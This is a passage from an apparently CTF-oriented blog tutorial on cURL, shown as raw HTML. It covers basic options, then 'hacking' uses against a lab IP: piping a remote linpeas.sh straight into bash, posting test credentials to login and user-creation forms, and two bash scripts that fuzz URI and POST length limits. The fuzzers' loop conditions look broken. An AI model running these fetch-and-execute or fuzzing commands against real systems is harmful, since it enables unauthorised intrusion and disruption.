    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PHPSESSID=vn0g4d94rs09rgpqga85r9bnia&amp;#34;&lt;/span&gt; http://10.10.10.10/home.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-user-agents&#34;&gt;
  cURL User Agents
  &lt;a href=&#34;#curl-user-agents&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&amp;#34;&lt;/span&gt; http://10.10.10.10/login.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-save-the-server-response-to-a-file&#34;&gt;
  cURL Save the server response to a file
  &lt;a href=&#34;#curl-save-the-server-response-to-a-file&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -o payload.sh http://10.10.10.10/payload.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-download-a-file-to-the-current-folder&#34;&gt;
  cURL download a file to the current folder
  &lt;a href=&#34;#curl-download-a-file-to-the-current-folder&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -O http://10.10.10.10/payload.zip&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-follow-http11-302-found-redirects&#34;&gt;
  cURL follow HTTP/1.1 302 Found redirects
  &lt;a href=&#34;#curl-follow-http11-302-found-redirects&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -L http://10.10.10.10/profile.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-output-response-headers-to-stdout&#34;&gt;
  cURL Output Response Headers to STDOUT
  &lt;a href=&#34;#curl-output-response-headers-to-stdout&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -i http://10.10.10.10/profile.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-view-verbose-debugging-information-response-headers-and-other-debug-details---std2&#34;&gt;
  cURL view verbose debugging information (response headers and other debug details - STD2)
  &lt;a href=&#34;#curl-view-verbose-debugging-information-response-headers-and-other-debug-details---std2&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -v http://10.10.10.10/profile.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&#34;hacking-with-curl&#34;&gt;
  Hacking with cURL
  &lt;a href=&#34;#hacking-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.&lt;/p&gt;

&lt;h3 id=&#34;using-curl-to-pipe-a-remote-scipt-linpeassh-directly-to-bash&#34;&gt;
  Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
  &lt;a href=&#34;#using-curl-to-pipe-a-remote-scipt-linpeassh-directly-to-bash&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -sSk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://10.10.10.10/linpeas.sh&amp;#34;&lt;/span&gt; | bash&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;attacking-a-login-form-with-curl&#34;&gt;
  Attacking a Login Form with cURL
  &lt;a href=&#34;#attacking-a-login-form-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email=test@test.com&amp;amp;password=test&amp;#34;&lt;/span&gt; http://10.10.10.10/login.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;creating-new-users-with-curl&#34;&gt;
  Creating new users with cURL
  &lt;a href=&#34;#creating-new-users-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name=test&amp;amp;email=test@test.com&amp;amp;password=test&amp;#34;&lt;/span&gt; http://10.10.10.10/newuser.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&#34;fuzzing-web-servers-with-curl&#34;&gt;
  Fuzzing Web Servers with cURL
  &lt;a href=&#34;#fuzzing-web-servers-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.&lt;/p&gt;

&lt;h3 id=&#34;fuzzing-with-uri-length--get-parameter-length-limits-with-curl&#34;&gt;
  Fuzzing with URI length / GET parameter length limits with cURL
  &lt;a href=&#34;#fuzzing-with-uri-length--get-parameter-length-limits-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. You can modify the url to either fuzz a URI or a GET parameter.&lt;/p&gt;
&lt;p&gt;Here is the bash shell script:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;args: &amp;lt;URL&amp;gt; &amp;lt;Start Length #&amp;gt; &amp;lt;End Length #&amp;gt; &amp;lt;Output Filepath&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Length Lines Words Bytes Filename&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;---------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $2; x &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $3; i++&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        fuzz&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 1; x &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $i; x++&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fuzz&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#echo &amp;#34;COUNT: $i $fuzz&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#echo &amp;#34;${1}${fuzz}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; tr -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; ; curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;}${&lt;/span&gt;fuzz&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -o &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;4&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; 2&amp;gt;/dev/null | wc &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;4&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here is an example of what it looks like running:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./fuzz_url.sh http://10.10.10.10/ 1000 1000000 output.txt
args: &amp;lt;URL&amp;gt; &amp;lt;Start Length #&amp;gt; &amp;lt;End Length #&amp;gt; &amp;lt;Output Filepath&amp;gt;
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt
100002 11  37 343 output.txt
100003 11  37 343 output.txt
100004 11  37 343 output.txt
100005 11  37 343 output.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&#34;fuzzing-post-parameter-length-limits-with-curl&#34;&gt;
  Fuzzing POST parameter length limits with cURL
  &lt;a href=&#34;#fuzzing-post-parameter-length-limits-with-curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.&lt;/p&gt;
&lt;p&gt;Here is the bash shell script:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;args: &amp;lt;URL&amp;gt; &amp;lt;Start Length #&amp;gt; &amp;lt;End Length #&amp;gt; &amp;lt;Output Filepath&amp;gt; &amp;lt;Post data: var=value&amp;amp;var2=valuefuzz&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Length Lines Words Bytes Filename&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;---------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $2; x &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $3; i++&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        fuzz&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 1; x &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $i; x++&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fuzz&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#echo &amp;#34;COUNT: $i $fuzz&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#echo &amp;#34;${5}${fuzz}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; | &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; tr -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; ; curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -o &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;4&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;5&lt;span style=&#34;color:#e6db74&#34;&gt;}${&lt;/span&gt;fuzz&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null | wc &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;4&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here is an example of what it looks like running:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./fuzz_post.sh http://10.10.10.10/ 1000 1000000 output.txt &amp;#34;user=test&amp;amp;password=test&amp;#34;
args: &amp;lt;URL&amp;gt; &amp;lt;Start Length #&amp;gt; &amp;lt;End Length #&amp;gt; &amp;lt;Output Filepath&amp;gt;
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&#34;check-to-see-if-a-user-login-is-correct-in-a-bash-script&#34;&gt;
  Check to see if a user login is correct in a Bash script
